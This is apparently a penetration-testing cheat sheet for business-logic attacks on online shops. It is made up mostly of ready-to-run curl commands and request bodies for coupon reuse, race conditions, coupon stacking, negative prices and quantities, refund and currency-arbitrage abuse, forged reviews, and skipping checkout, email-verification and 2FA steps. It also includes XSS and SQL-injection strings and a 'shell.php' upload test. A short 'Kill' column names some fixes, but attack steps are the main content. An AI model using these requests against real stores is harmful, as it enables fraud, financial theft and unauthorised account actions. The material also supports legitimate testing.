# COUPON / DISCOUNT ABUSE — EXECUTION

| Attack | Signal | Test | Confirm | Kill |
|--------|--------|------|---------|------|
| **Reuse Coupon** | coupon_code field | `curl -X POST /checkout -d '{"coupon":"WELCOME20","qty":1}'` ×2 | Both succeed with discount | "already redeemed" |
| **Race Coupon** | coupon endpoint | `for i in {1..30}; do curl -X POST /apply-coupon -d '{"code":"WELCOME20"}' &; done; wait` | All 30 return 200 | unique constraint DB |
| **Stack Coupons** | multiple coupon fields | `curl -X POST /checkout -d '{"coupons":["WELCOME20","FRIEND10","VIP50"]}'` | All discounts applied | single coupon field |
| **Negative Qty** | quantity field | `curl -X POST /checkout -d '{"qty":-5,"price":100}'` | Total = -500 | qty validated >=1 |
| **Negative Price** | price field | `curl -X POST /cart/add -d '{"item_id":1,"price":-100}'` | Cart total decreases | server-side price calc |
| **% > 100** | percent_off field | `curl -X POST /checkout -d '{"coupon":"PCT","percent_off":150}'` | Total negative | max 100% cap |

## CURL COMMANDS
```bash
# Parallel race (30 simultaneous)
for i in {1..30}; do
  curl -s -X POST /api/apply-coupon \
    -H "Cookie: SESSION_A" \
    -d '{"code":"WELCOME20"}' &
done; wait

# Coupon stacking
curl -X POST /api/checkout -H "Cookie: A" \
  -d '{"items":[{"id":1,"qty":1}], "coupons":["WELCOME20","FRIEND10","NEWUSER50"]}'

# Negative quantity
curl -X POST /api/cart/add -H "Cookie: A" \
  -d '{"product_id":123, "quantity":-5, "price":99.99}'

# Check if discount persisted
curl -s -X GET /api/order/confirm -H "Cookie: A" | jq '.total'
```

## DECISION TREE
```
Found coupon system?
├─ Can apply same coupon twice?
│  ├─ Both succeed → COUPON REUSE or RACE
│  └─ Second fails → one-time lock
├─ Can apply multiple coupons?
│  ├─ Yes → STACKING (chain: 10 coupons = 100% off)
│  └─ No → single coupon limit
├─ Negative quantity accepted?
│  ├─ Yes → NEGATIVE PRICING (chain: infinite negative = free anything)
│  └─ No → validation present
└─ Percent off > 100?
   ├─ Yes → NEGATIVE TOTAL
   └─ No → capped at 100%
```

## CHAIN
Coupon Race + IDOR = Apply N coupons to another user's order
Coupon Stacking + Wallet = Free credit generation

## PRACTICAL SCENARIOS FROM COMMUNITY

### 1. Price & Value Manipulation
```bash
# تغيير السعر يدويًا
POST /checkout 
Host: target.com
{"item_id": "123", "price": "0.01", "qty": "1"}

# سعر سالب
POST /cart/add
{"product_id": 123, "quantity": 1, "price": -100}

# إضافة قيمة سالبة
POST /checkout
{"price": 100} → {"price": "+-120"}

# Multiplication injection
POST /checkout
{"price": 100} → {"price": "0.5*100"}

# Currency code manipulation
POST /checkout
{"currency": "USD", "amount": 100} → {"currency": "EUR", "amount": 100}
```

### 2. Coupon Code Functionality 
```bash
# Reuse same coupon (test reusability)
curl -X POST /api/cart/coupon -d '{"code":"SAVE20"}' -b "session=ABC"
curl -X POST /api/cart/coupon -d '{"code":"SAVE20"}' -b "session=ABC"
# Check if both returned 200 → reusable

# Race condition on single-use coupon
for i in {1..30}; do
  curl -s -X POST /api/apply-coupon \
    -H "Cookie: SESSION_A" \
    -d '{"code":"WELCOME20"}' &
  curl -s -X POST /api/apply-coupon \
    -H "Cookie: SESSION_B" \
    -d '{"code":"WELCOME20"}' &
done; wait
# Check if multiple accounts got the same coupon discount

# Mass Assignment / HPP to add multiple coupons
POST /api/checkout
{"coupon_code": "SAVE10", "coupon_code": "SAVE20", "coupon_code": "VIP50"}
# or
POST /api/checkout
{"coupons": ["SAVE10", "SAVE20", "VIP50"]}

# Apply discount on non-covered products
# 1. Coupon "CLOTHES20" only for clothes category
# 2. Add electronics to cart + apply CLOTHES20
# 3. Check if discount is applied to electronics

# Missing input sanitization
# Test XSS, SQLi in coupon_code field
POST /api/cart/coupon -d '{"code":"<script>alert(1)</script>"}'
POST /api/cart/coupon -d '{"code":"SAVE20' OR '1'='1"}'
```

### 3. Delivery Charges Abuse
```bash
# Tamper delivery charge to negative
POST /api/checkout
{"delivery_charge": -50, "items": [...]}

# Free delivery bypass
POST /api/checkout
{"delivery_charge": 0, "items": [...]}

# Check if delivery charge validation is server-side
```

### 4. Currency Arbitrage
```bash
# Pay in USD, request refund in EUR
# Due to conversion rate differences, may gain more
POST /api/payment
{"currency": "USD", "amount": 100}

POST /api/refund
{"currency": "EUR", "amount": 100}
# Check refund value in original currency
```

### 5. Refund Feature Abuse
```bash
# Purchase → refund → check if feature still accessible
curl -X POST /api/subscribe -d '{"plan":"premium"}' -b "session=A"
curl -X POST /api/refund -d '{"subscription_id": 123}' -b "session=A"
# Try accessing premium feature after refund
curl -X GET /api/premium/content -b "session=A"

# Multiple refund requests (race)
for i in {1..10}; do
  curl -X POST /api/refund -d '{"order_id": 456}' -b "session=A" &
done; wait

# Refund amount > purchase amount
POST /api/refund
{"order_id": 123, "amount": 9999}
```

### 6. Cart/Wishlist Abuse
```bash
# Negative quantity to balance
POST /api/cart/add
{"product_id": 1, "quantity": -5, "price": 100}
{"product_id": 2, "quantity": 5, "price": 100}
# Total = 0 (product 1 cancels product 2)

# Exceed available quantity
POST /api/cart/add
{"product_id": 1, "quantity": 9999}

# Move item to another user's cart
POST /api/wishlist/move-to-cart
{"item_id": 123, "target_user": "victim_user"}
```

### 7. Review Functionality Abuse
```bash
# Post as "Verified Reviewer" without purchasing
POST /api/review
{"product_id": 1, "rating": 5, "verified": true, "comment": "Great!"}

# Rating beyond scale (0 or 6)
POST /api/review {"product_id": 1, "rating": 0}
POST /api/review {"product_id": 1, "rating": 6}
POST /api/review {"product_id": 1, "rating": -1}

# Multiple ratings by same user (race)
for i in {1..20}; do
  curl -X POST /api/review -d '{"product_id":1,"rating":5}' -b "session=A" &
done; wait

# Post review as other user
POST /api/review
{"product_id": 1, "user_id": "victim_id", "rating": 1, "comment": "Bad!"}

# File upload in review (test for unrestricted upload)
POST /api/review
Content-Type: multipart/form-data
{"product_id": 1, "file": "shell.php"}
```

### 8. Multi-Step Process Bypass
```bash
# Skip step 2 of 4-step checkout
# Complete process once, record all URLs
# Then skip directly to final step:
curl -X POST /order/confirm -d '{"step":"payment"}' -b "session=A"

# Bypass email verification
curl -X GET /api/account/verify?token=ANYTHING -b "session=A"
# or directly access protected areas
curl -X GET /api/dashboard -b "session=A"

# Skip 2FA step
curl -X GET /api/settings -H "Cookie: session=A"
# instead of: POST /login → POST /2fa/verify → GET /settings
